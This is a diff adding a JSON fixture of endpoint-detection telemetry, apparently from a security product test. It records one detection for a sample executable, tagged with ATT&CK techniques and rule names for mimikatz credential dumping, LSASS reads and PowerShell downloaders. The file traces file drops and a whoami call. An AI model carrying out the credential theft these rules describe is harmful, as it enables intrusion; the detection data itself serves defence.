@@ -1,0 +1,2323 @@
+{
+    "detections": [
+        {
+            "id": "5502734",
+            "traceId": "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+            "firstDetected": "2024-09-24T13:19:31Z",
+            "severity": "s4",
+            "rank": 280,
+            "tags": [
+                "@ATA.Collection",
+                "@ATA.CommandAndControl",
+                "@ATA.CredentialAccess",
+                "@ATA.DefenseEvasion",
+                "@ATA.Discovery",
+                "@ATA.Execution",
+                "@ATA.LateralMovement",
+                "@ATA.Persistence",
+                "@ATA.PrivilegeEscalation",
+                "@ATE.T1003",
+                "@ATE.T1003.001",
+                "@ATE.T1003.002",
+                "@ATE.T1003.003",
+                "@ATE.T1003.004",
+                "@ATE.T1003.005",
+                "@ATE.T1003.006",
+                "@ATE.T1003.007",
+                "@ATE.T1003.008",
+                "@ATE.T1005",
+                "@ATE.T1016",
+                "@ATE.T1021.002",
+                "@ATE.T1021.006",
+                "@ATE.T1027",
+                "@ATE.T1033",
+                "@ATE.T1047",
+                "@ATE.T1053.005",
+                "@ATE.T1056.001",
+                "@ATE.T1056.004",
+                "@ATE.T1057",
+                "@ATE.T1059",
+                "@ATE.T1059.001",
+                "@ATE.T1068",
+                "@ATE.T1069.001",
+                "@ATE.T1071",
+                "@ATE.T1071.001",
+                "@ATE.T1074.001",
+                "@ATE.T1082",
+                "@ATE.T1087.001",
+                "@ATE.T1102",
+                "@ATE.T1102.003",
+                "@ATE.T1105",
+                "@ATE.T1106",
+                "@ATE.T1119",
+                "@ATE.T1134",
+                "@ATE.T1134.001",
+                "@ATE.T1134.002",
+                "@ATE.T1134.003",
+                "@ATE.T1140",
+                "@ATE.T1550.002",
+                "@ATE.T1550.003",
+                "@ATE.T1552.001",
+                "@ATE.T1552.002",
+                "@ATE.T1552.004",
+                "@ATE.T1552.006",
+                "@ATE.T1555.003",
+                "@ATE.T1555.004",
+                "@ATE.T1558.001",
+                "@ATE.T1558.002",
+                "@ATE.T1620",
+                "@MSI._Api_Keystate_Capturehook",
+                "@MSI._api_tokenprivileges_lsass",
+                "@MSI._apt_process_PS_Get_userinfo",
+                "@MSI._apt_process_PS_env_systeminfo",
+                "@MSI._apt_process_PS_win32_systeminfo",
+                "@MSI._apt_process_gwmi",
+                "@MSI._apt_process_whoami_high",
+                "@MSI._apt_process_whoami_high_via_powershell",
+                "@MSI._exploit_mimikatz_dumpcreds",
+                "@MSI._file_pe_malware_folder",
+                "@MSI._hunting_credential_access2",
+                "@MSI._hunting_powershell_mimikatz_execution",
+                "@MSI._malware_powershell_downloader_low",
+                "@MSI._malware_ps_creddumps",
+                "@MSI._malware_scripting_lsass_memory_read",
+                "@MSI._process_accessed_lsass_high_0x1010",
+                "@MSI._process_collect_browser_data_2",
+                "@MSI._process_copy_file_wget",
+                "@MSI._process_creds_edge",
+                "@MSI._process_local_data_staging",
+                "@MSI._process_mimikatz_creddump",
+                "@MSI._process_mimikatz_lsass_access",
+                "@MSI._process_powershell_download_public_repo",
+                "@MSI._process_powershell_execute_remote_command",
+                "@MSI._process_ps_get_process",
+                "@MSI._process_ps_invoke_mimikatz",
+                "@MSI._process_ps_invoke_mimikatz_script",
+                "@MSI._process_psdownload",
+                "@MSI._process_psexecexpression",
+                "@MSI._process_psobfuscation",
+                "@MSI._process_psobfuscation_character_tick",
+                "@MSI._process_psobfuscation_frombase64",
+                "@MSI._process_pswebrequest_remotecopy",
+                "@MSI._process_public_repos",
+                "@MSI._process_remote_invoke_command",
+                "@MSI._process_remote_powershell_mimikatz_lsass",
+                "@MSI._process_schtasks_mimikatz_creddump_via_powershell",
+                "@MSI._process_suspicious_path",
+                "@MSI._process_suspicious_powershell_mimikatz_lsass",
+                "@MSI._ps_pe_aware",
+                "@MSI._ps_privileged_operations",
+                "@MSI._ps_privileged_operations2",
+                "@MSI._ps_redteam_accesscontrol_nishang",
+                "@MSI._ps_redteam_credaccess_nishang",
+                "@MSI._ps_reflection_assembly"
+            ],
+            "host": {
+                "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+                "hostname": "7ZFW10RS5X64",
+                "os": {
+                    "major": 10,
+                    "minor": 0,
+                    "build": 17763,
+                    "sp": "",
+                    "desc": "Windows 10"
+                },
+                "lastBootTime": "2024-09-20T15:14:04Z",
+                "netInterfaces": [
+                    {
+                        "name": "Ethernet0",
+                        "macAddress": "00:50:56:a4:fd:ff",
+                        "ip": "10.26.41.229",
+                        "type": 6
+                    },
+                    {
+                        "name": "Primary",
+                        "ip": "10.26.41.229"
+                    }
+                ],
+                "traceExtendedVisibility": 0,
+                "hostOs": "windows"
+            },
+            "sha256": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146"
+        }
+    ],
+    "traces": [
+        {
+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:18Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "File Created",
+            "fileAttributes": {
+                "creationDate": "2024-09-24T13:18:04.444Z",
+                "fsattrs": 16,
+                "lastModificationDate": "2024-09-24T13:18:04.523Z",
+                "md5": "",
+                "name": "_MEI82522",
+                "path": "C:\\Users\\cdaauto\\AppData\\Local\\Temp\\_MEI82522",
+                "sha1": "",
+                "sha256": "",
+                "size": 4096
+            },
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "pFullName": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+            "pSha2": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146",
+            "parentTraceId": "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+            "pid": 8252,
+            "ppid": 8252,
+            "rv": 4528,
+            "tags": [
+                "@AC.NonPECreated"
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:04.458Z",
+            "traceId": "f3e2fbf8-cea5-410b-9b05-d1d1c5ef610d",
+            "uniqueRuleId": 1,
+            "version": "3.0",
+            "action": "",
+            "productId": "",
+            "description": ""
+        },
+        {
+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:18Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "File Created",
+            "fileAttributes": {
+                "creationDate": "2024-09-24T13:18:04.476Z",
+                "embedFileVersion": "9.00.30729.9415",
+                "embedFilename": "MSVCP90.DLL",
+                "embedProductName": "Microsoft® Visual Studio® 2008",
+                "embedProductVersion": "9.00.30729.9415",
+                "embedVendorName": "Microsoft Corporation",
+                "fileType": "PE",
+                "fsattrs": 32,
+                "lastModificationDate": "2024-09-24T13:18:04.476Z",
+                "md5": "6FDF6DE3C560C05EAEA544EFFC462C22",
+                "name": "msvcp90.dll",
+                "path": "C:\\Users\\cdaauto\\AppData\\Local\\Temp\\_MEI82522\\msvcp90.dll",
+                "sha1": "4409F68AC0BB71B7D9CC1929576E66DC2A0FA3BF",
+                "sha256": "0EA812448EA5EB1A7B3D6E1DD4D2425C7FA5474E25C89BC561828930D58D5F8F",
+                "size": 854160
+            },
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "pFullName": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+            "pSha2": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146",
+            "parentTraceId": "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+            "pid": 8252,
+            "ppid": 8252,
+            "rv": 4528,
+            "tags": [
+                "@AC.PECreated"
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:04.487Z",
+            "traceId": "f8b3bfd8-dd7c-43d5-b1ae-a06ed52f9fd9",
+            "uniqueRuleId": 21,
+            "version": "3.0",
+            "action": "",
+            "productId": "",
+            "description": ""
+        },
+        {
+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:18Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "File Created",
+            "fileAttributes": {
+                "creationDate": "2024-09-24T13:18:04.491Z",
+                "embedFileVersion": "9.00.30729.9415",
+                "embedFilename": "MSVCR90.DLL",
+                "embedProductName": "Microsoft® Visual Studio® 2008",
+                "embedProductVersion": "9.00.30729.9415",
+                "embedVendorName": "Microsoft Corporation",
+                "fileType": "PE",
+                "fsattrs": 32,
+                "lastModificationDate": "2024-09-24T13:18:04.491Z",
+                "md5": "4476B0E481817DBF743025643130802A",
+                "name": "msvcr90.dll",
+                "path": "C:\\Users\\cdaauto\\AppData\\Local\\Temp\\_MEI82522\\msvcr90.dll",
+                "sha1": "6A9AB843A853F4F053A53631DD26B2D83AB5DF92",
+                "sha256": "BE19717A32F8ED4ADEC5C4E4A315797FD06827F49824C72BB26E797264DC6C06",
+                "size": 642192
+            },
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "pFullName": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+            "pSha2": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146",
+            "parentTraceId": "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+            "pid": 8252,
+            "ppid": 8252,
+            "rv": 4528,
+            "tags": [
+                "@AC.PECreated"
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:04.495Z",
+            "traceId": "2a39c990-07d1-443d-a192-63da10c2889e",
+            "uniqueRuleId": 21,
+            "version": "3.0",
+            "action": "",
+            "productId": "",
+            "description": ""
+        },
+        {
+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:48Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "File Deleted",
+            "fileAttributes": {
+                "creationDate": "2024-09-24T13:18:04.444Z",
+                "fsattrs": 16,
+                "lastModificationDate": "2024-09-24T13:18:14.776Z",
+                "md5": "D41D8CD98F00B204E9800998ECF8427E",
+                "name": "_MEI82522",
+                "path": "C:\\Users\\cdaauto\\AppData\\Local\\Temp\\_MEI82522",
+                "sha1": "DA39A3EE5E6B4B0D3255BFEF95601890AFD80709",
+                "sha256": "E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855",
+                "size": 0
+            },
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "pFullName": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+            "pSha2": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146",
+            "parentTraceId": "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+            "pid": 8252,
+            "ppid": 8252,
+            "rv": 4528,
+            "tags": [
+                "@AC.NonPECreated"
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:14.777Z",
+            "traceId": "5659e40e-f163-419c-9cda-2e6f7c35192d",
+            "uniqueRuleId": 6,
+            "version": "3.0",
+            "action": "",
+            "productId": "",
+            "description": ""
+        },
+        {
+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:48Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "File Deleted",
+            "fileAttributes": {
+                "creationDate": "2024-09-24T13:18:04.507Z",
+                "embedFileVersion": "2.7.15",
+                "embedFilename": "python27.dll",
+                "embedProductName": "Python",
+                "embedProductVersion": "2.7.15",
+                "embedVendorName": "Python Software Foundation",
+                "fileType": "PE",
+                "fsattrs": 32,
+                "lastModificationDate": "2024-09-24T13:18:04.507Z",
+                "md5": "076A8A0DD3BEC1B61110B87A989C994F",
+                "name": "python27.dll",
+                "path": "C:\\Users\\cdaauto\\AppData\\Local\\Temp\\_MEI82522\\python27.dll",
+                "sha1": "B6771A7B63B106C3FCCBF8C0477952758109A724",
+                "sha256": "65C735B2E427755241BFA61BC3249D7169B63E49B314EB9405C6BCF74AFB8754",
+                "size": 3428864
+            },
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "pFullName": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+            "pSha2": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146",
+            "parentTraceId": "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+            "pid": 8252,
+            "ppid": 8252,
+            "rv": 4528,
+            "tags": [
+                "@AC.PECreated"
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:14.774Z",
+            "traceId": "531f6889-3847-4668-89f0-12f37684867a",
+            "uniqueRuleId": 36,
+            "version": "3.0",
+            "action": "",
+            "productId": "",
+            "description": ""
+        },
+        {
+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:18Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "File Created",
+            "fileAttributes": {
+                "creationDate": "2024-09-24T13:18:04.476Z",
+                "embedFileVersion": "9.00.30729.9415",
+                "embedFilename": "MSVCM90.DLL",
+                "embedProductName": "Microsoft® Visual Studio® 2008",
+                "embedProductVersion": "9.00.30729.9415",
+                "embedVendorName": "Microsoft Corporation",
+                "fileType": "PE",
+                "fsattrs": 32,
+                "lastModificationDate": "2024-09-24T13:18:04.476Z",
+                "md5": "EEB589C9BBDE63C4FBCA535A305F7244",
+                "name": "msvcm90.dll",
+                "path": "C:\\Users\\cdaauto\\AppData\\Local\\Temp\\_MEI82522\\msvcm90.dll",
+                "sha1": "B9F95668021364EB0606C5C10D007D1CC308BE33",
+                "sha256": "C94D7845048EE8D558FD97B6BC04D2829CA05C7199B662AFFB8ADDB7D5D98DFF",
+                "size": 245760
+            },
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "pFullName": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+            "pSha2": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146",
+            "parentTraceId": "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+            "pid": 8252,
+            "ppid": 8252,
+            "rv": 4528,
+            "tags": [
+                "@AC.PECreated"
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:04.481Z",
+            "traceId": "dd308c73-ab47-4080-9ea7-248afeff7154",
+            "uniqueRuleId": 21,
+            "version": "3.0",
+            "severity": "s0",
+            "detectionsSets": [
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.DefenseEvasion",
+                        "@MSI._file_pe_malware_folder"
+                    ]
+                }
+            ],
+            "action": "",
+            "productId": "",
+            "description": ""
+        },
+        {
+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:48Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "File Deleted",
+            "fileAttributes": {
+                "creationDate": "2024-09-24T13:18:04.476Z",
+                "embedFileVersion": "9.00.30729.9415",
+                "embedFilename": "MSVCM90.DLL",
+                "embedProductName": "Microsoft® Visual Studio® 2008",
+                "embedProductVersion": "9.00.30729.9415",
+                "embedVendorName": "Microsoft Corporation",
+                "fileType": "PE",
+                "fsattrs": 32,
+                "lastModificationDate": "2024-09-24T13:18:04.476Z",
+                "md5": "EEB589C9BBDE63C4FBCA535A305F7244",
+                "name": "msvcm90.dll",
+                "path": "C:\\Users\\cdaauto\\AppData\\Local\\Temp\\_MEI82522\\msvcm90.dll",
+                "sha1": "B9F95668021364EB0606C5C10D007D1CC308BE33",
+                "sha256": "C94D7845048EE8D558FD97B6BC04D2829CA05C7199B662AFFB8ADDB7D5D98DFF",
+                "size": 245760
+            },
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "pFullName": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+            "pSha2": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146",
+            "parentTraceId": "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+            "pid": 8252,
+            "ppid": 8252,
+            "rv": 4528,
+            "tags": [
+                "@AC.PECreated"
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:14.769Z",
+            "traceId": "9c58c188-2824-40a9-8530-2cb7dd496c48",
+            "uniqueRuleId": 36,
+            "version": "3.0",
+            "action": "",
+            "productId": "",
+            "description": ""
+        },
+        {
+            "cmdLine": "\"C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe\" ",
+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:18Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "Process Created",
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "integrity": 3,
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "pFullName": "C:\\Windows\\explorer.exe",
+            "pSha2": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146",
+            "parentTraceId": "1a017f04-231b-4eaf-b3da-126da184ce99",
+            "parentsTraceId": [
+                "1a017f04-231b-4eaf-b3da-126da184ce99"
+            ],
+            "pid": 8252,
+            "ppid": 5468,
+            "procFileAttrs": {
+                "creationDate": "2024-09-20T15:28:22.296Z",
+                "md5": "E2E43E9D0C479E0E5D41BCB4EA9FA1B4",
+                "name": "code-injection-sample.exe",
+                "path": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+                "sha1": "28E9D7E4158FCFBAC28A9187390AB7918CE08F44",
+                "sha256": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146",
+                "size": 3971501,
+                "subsystem": 3
+            },
+            "processName": "code-injection-sample.exe",
+            "rv": 4528,
+            "tags": [
+                "@AC.ProcessCreated"
+            ],
+            "tdmRuleIds": [
+                108,
+                100000,
+                100002,
+                100003,
+                100005
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:04.308Z",
+            "traceId": "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+            "user": {
+                "domain": "CDA",
+                "id": "S-1-5-21-2561662139-2012859153-108931552-1137",
+                "name": "cdaauto"
+            },
+            "version": "3.0",
+            "severity": "s0",
+            "detectionsSets": [
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@MSI._process_suspicious_path"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.DefenseEvasion",
+                        "@MSI._file_pe_malware_folder"
+                    ]
+                }
+            ],
+            "endTime": null,
+            "originalSeverity": "s0",
+            "processCharacteristics": "",
+            "contained": "no",
+            "flagged": false,
+            "containedBy": "",
+            "summary": [
+                {
+                    "attribute": "cmdline",
+                    "attributeKey": "cmdLine",
+                    "label": "TRACE_TIMELINE.DETAILS.CMD_LINE",
+                    "summarizable": true,
+                    "shouldDisplayReadMore": true,
+                    "shouldDisplayCopyToClipboard": true
+                },
+                {
+                    "attribute": "domainName",
+                    "attributeKey": "user.domain",
+                    "label": "TRACE_TIMELINE.DETAILS.DOMAIN_NAME",
+                    "summarizable": true
+                },
+                {
+                    "attribute": "user",
+                    "attributeKey": "user.name",
+                    "label": "TRACE_TIMELINE.DETAILS.USER",
+                    "links": [
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ONE",
+                            "searchTarget": [
+                                "${maGuid}"
+                            ],
+                            "searchHostname": [
+                                "${hostname}"
+                            ],
+                            "drillDownKey": "PROCESS_USER_ONE",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.LOGGED_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "LoggedInUsers"
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "LoggedInUsers",
+                                                    "output": "username",
+                                                    "op": "EQUALS",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        }
+                    ],
+                    "summarizable": true
+                }
+            ],
+            "pidTraceId": "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+            "lastActivityTime": "2024-09-24T13:18:14.777Z",
+            "reputationInfo": {
+                "reason": ""
+            }
+        },
+        {
+            "cmdLine": "\"C:\\Windows\\system32\\whoami.exe\" /user",
+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:18Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "Process Created",
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "integrity": 3,
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "pSha2": "1D5491E3C468EE4B4EF6EDFF4BBC7D06EE83180F6F0B1576763EA2EFE049493A",
+            "parentTraceId": "f7f79d02-14d5-41c2-a6a2-a609f5d3b006",
+            "parentsTraceId": [
+                "f7f79d02-14d5-41c2-a6a2-a609f5d3b006",
+                "c53abccc-0278-4580-b74c-7112da49ff6b",
+                "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+                "1a017f04-231b-4eaf-b3da-126da184ce99"
+            ],
+            "pid": 876,
+            "ppid": 8004,
+            "procFileAttrs": {
+                "creationDate": "2018-09-15T07:29:24.642Z",
+                "embedFileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
+                "embedFilename": "whoami.exe",
+                "embedProductName": "Microsoft® Windows® Operating System",
+                "embedProductVersion": "10.0.17763.1",
+                "embedVendorName": "Microsoft Corporation",
+                "md5": "43C2D3293AD939241DF61B3630A9D3B6",
+                "name": "whoami.exe",
+                "path": "C:\\Windows\\System32\\whoami.exe",
+                "reputation": {
+                    "reputation": 99,
+                    "vtpPrivileges": 1
+                },
+                "sha1": "47D7864D26FC67E0D60391CBF170D33DA518C322",
+                "sha256": "1D5491E3C468EE4B4EF6EDFF4BBC7D06EE83180F6F0B1576763EA2EFE049493A",
+                "size": 71680,
+                "subsystem": 3
+            },
+            "processName": "whoami.exe",
+            "rv": 4528,
+            "tags": [
+                "@AC.AdminHackingToolExecuted",
+                "@AC.ProcessCreated"
+            ],
+            "tdmRuleIds": [
+                110,
+                100000,
+                100003,
+                100009
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:08.046Z",
+            "traceId": "33224883-2929-4240-bd0e-7b110fc8887b",
+            "user": {
+                "domain": "CDA",
+                "id": "S-1-5-21-2561662139-2012859153-108931552-1137",
+                "name": "cdaauto"
+            },
+            "version": "3.0",
+            "severity": "s0",
+            "detectionsSets": [
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Discovery",
+                        "@ATE.T1033",
+                        "@MSI._apt_process_whoami_high"
+                    ]
+                }
+            ],
+            "endTime": null,
+            "originalSeverity": "s0",
+            "processCharacteristics": "",
+            "contained": "no",
+            "flagged": false,
+            "containedBy": "",
+            "summary": [
+                {
+                    "attribute": "cmdline",
+                    "attributeKey": "cmdLine",
+                    "label": "TRACE_TIMELINE.DETAILS.CMD_LINE",
+                    "summarizable": true,
+                    "shouldDisplayReadMore": true,
+                    "shouldDisplayCopyToClipboard": true
+                },
+                {
+                    "attribute": "domainName",
+                    "attributeKey": "user.domain",
+                    "label": "TRACE_TIMELINE.DETAILS.DOMAIN_NAME",
+                    "summarizable": true
+                },
+                {
+                    "attribute": "user",
+                    "attributeKey": "user.name",
+                    "label": "TRACE_TIMELINE.DETAILS.USER",
+                    "links": [
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ONE",
+                            "searchTarget": [
+                                "${maGuid}"
+                            ],
+                            "searchHostname": [
+                                "${hostname}"
+                            ],
+                            "drillDownKey": "PROCESS_USER_ONE",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.LOGGED_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "LoggedInUsers"
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "LoggedInUsers",
+                                                    "output": "username",
+                                                    "op": "EQUALS",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        }
+                    ],
+                    "summarizable": true
+                }
+            ],
+            "pidTraceId": "33224883-2929-4240-bd0e-7b110fc8887b",
+            "lastActivityTime": "2024-09-24T13:18:08.046Z",
+            "reputationInfo": {
+                "reason": ""
+            }
+        },
+        {
